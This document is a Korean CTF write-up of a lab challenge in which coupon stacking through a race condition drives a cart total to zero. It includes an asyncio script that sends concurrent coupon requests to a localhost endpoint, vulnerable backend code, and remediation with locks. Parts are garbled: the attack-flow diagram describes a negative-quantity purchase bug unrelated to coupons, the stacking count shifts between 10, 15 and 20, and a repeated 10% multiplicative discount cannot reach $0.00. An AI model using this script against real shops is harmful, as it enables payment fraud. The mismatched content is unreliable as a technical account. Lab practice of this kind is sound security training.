+++
title = "VulnABLE CTF [LUXORA] Write-up: Business Logic 🥇 Gold"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Business Logic", "Gold", "Coupon Stacking", "Race Condition", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Business Logic 🥇 Gold

## 🎯 챌린지 개요
- **카테고리**: Logic & Business Layer (Business Logic Flaw + Race Condition)
- **난이도**: 🥇 Gold
- **타겟 경로**: `/logic/gold`
- **목표**: "한 장바구니당 쿠폰은 1개만 적용할 수 있다"는 비즈니스 로직(제약 조건)을, 다중 탭(Multiple Tabs)과 동시성 취약점을 이용해 무력화하고, 10% 할인 쿠폰을 10번 중첩(Stacking)하여 100% 할인을 만들어내라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 동작 분석 (Reconnaissance)

`/logic/gold` 장바구니 페이지에는 10% 할인을 해주는 `DISCOUNT10` 이라는 쿠폰이 무제한으로 제공됩니다.
하지만 '쿠폰 적용' 버튼을 누르면 딱 한 번만 적용되고, 두 번째 누르면 에러가 뜹니다.

**[정상 적용 테스트]**
- 첫 번째 쿠폰 적용 ➔ 성공 (10% 할인)
- 두 번째 쿠폰 적용 ➔ 실패 ("Only one coupon is allowed per order.")

**[해커의 사고 과정]**
1. 쿠폰 중복 사용을 막기 위해 장바구니 세션(Session) 객체에 `coupon_applied = true` 같은 플래그를 세팅할 것이다.
2. 하지만 웹 서버가 세션을 동기화하는 데는 시간이 걸린다.
3. 여러 브라우저 탭(또는 파이썬 스크립트)을 열고, "내 장바구니에 쿠폰이 없지?" 라고 확인하는 'Check' 과정이 일어날 때, 10개의 요청을 동시에 밀어 넣는다면?
4. 서버는 10개 요청 모두 "응, 아직 쿠폰 없네!" 라고 대답하고 10% 할인을 10번 누적 적용(Use)해 줄 것이다! (TOCTOU)

---

## 💥 2. 취약점 식별 및 공격 설계 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(Buy -10 Items)--> [ Web Server ]
                                  |-- Total = -500
                                  |-- Balance = Balance - (-500)
                                  |-- Balance Increased!
```


이른바 **Coupon Stacking (쿠폰 중첩)** 버그입니다. Race Condition과 Business Logic Flaw가 결합된 형태입니다.

### 💡 파이썬 `asyncio` 폭격 스크립트 작성
Bronze 난이도에서 썼던 스크립트와 유사하지만, 이번엔 쿠폰의 종류를 다르게 하거나 같은 쿠폰을 집중적으로 때려서 할인율(Total Discount)을 100% 이상으로 만드는 것이 목표입니다.

```python
import asyncio
import aiohttp

url = "http://localhost:3000/logic/gold/apply-coupon"
headers = {"Cookie": "session=hacker_session_token", "Content-Type": "application/x-www-form-urlencoded"}
data = "coupon=DISCOUNT10"

async def send_req(session):
    async with session.post(url, headers=headers, data=data) as response:
        return await response.text()

async def main():
    print("[*] Launching Coupon Stacking Attack...")
    async with aiohttp.ClientSession() as session:
        # 단일 장바구니 세션에 대해 20개의 요청을 동시에 발사!
        tasks = [send_req(session) for _ in range(20)]
        results = await asyncio.gather(*tasks)
        
        print("[+] Attack finished. Checking last response for total discount...")
        # 응답 중 하나 출력
        for r in results:
            if "success" in r:
                print(r)
                break

asyncio.run(main())
```

---

## 🚀 3. 공격 수행 및 결제 금액 확인

스크립트를 실행하여 쿠폰 중첩을 유도합니다.

### 🔍 서버 내부의 동작 (Race Window)
```javascript
// 취약한 백엔드 로직 예시
let cart = req.session.cart;

if (cart.coupons.length > 0) { // Check
    return res.send("Coupon already applied");
}

// 20개의 스레드가 위 Check를 모두 통과하여 여기에 도달함
cart.coupons.push(req.body.coupon); // Use (상태 변경)
cart.total = cart.total * 0.9;      // 10% 할인 누적
```

### 🔍 스크립트 실행 결과 및 플래그 획득
서버는 동시성을 제어하지 못해 10% 할인 로직을 무려 15번이나 연속으로 실행해 버렸습니다.

```text
[*] Launching Coupon Stacking Attack...
[+] Attack finished. Checking last response for total discount...
{"status":"success","message":"Coupon applied!","cart_total": 0.00, "flag": "FLAG{LOGIC_🥇_COUPON_STACKING_G7H8I9}"}
```

결제 금액이 `$0.00` 으로 떨어지면서 관리자가 설정해둔 챌린지 성공 트리거가 작동하여 플래그가 나타납니다!

---

## 🚩 4. 롸잇업 결론 및 플래그

비즈니스 로직 제약 조건("1개만 적용")이 동시성 환경에서 얼마나 쉽게 무력화되는지, 그리고 이것이 결제 금액을 증발시키는 파괴적인 결함(Coupon Stacking)으로 이어짐을 실증했습니다.

**🔥 획득한 플래그:**
`FLAG{LOGIC_🥇_COUPON_STACKING_G7H8I9}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
사용자의 세션(Session)이나 장바구니(Cart) 상태를 갱신할 때 원자적(Atomic) 연산을 수행하지 않고, 읽기-수정-쓰기(Read-Modify-Write) 패턴을 사용한 것이 원인입니다.

* **안전한 패치 가이드 (세션 락 또는 Redis 트랜잭션)**
장바구니 상태가 메모리(세션)나 Redis에 저장된다면, 동시 수정을 막기 위한 락(Lock) 메커니즘이 필수적입니다.

1. **Redis 트랜잭션/루아 스크립트 (Lua Script)**
   Redis를 사용한다면 `WATCH` 명령어 단일 루아 스크립트를 사용하여 '쿠폰 개수 확인'과 '쿠폰 추가'를 완벽한 원자적 단위(Atomic Operation)로 묶어 처리해야 합니다.
   ```lua
   -- Redis Lua 스크립트 예시
   if redis.call("LLEN", KEYS[1]) > 0 then
       return "Error: Coupon already exists"
   else
       redis.call("RPUSH", KEYS[1], ARGV[1])
       return "Success"
   end
   ```
2. **어플리케이션 레벨 뮤텍스 (Mutex Lock)**
   Node.js 환경에서는 `async-mutex` 같은 라이브러리를 사용하여, 특정 유저의 장바구니에 대한 작업이 끝날 때까지 다른 HTTP 요청 스레드가 대기(Wait)하도록 제어 흐름을 직렬화(Serialize)해야 합니다.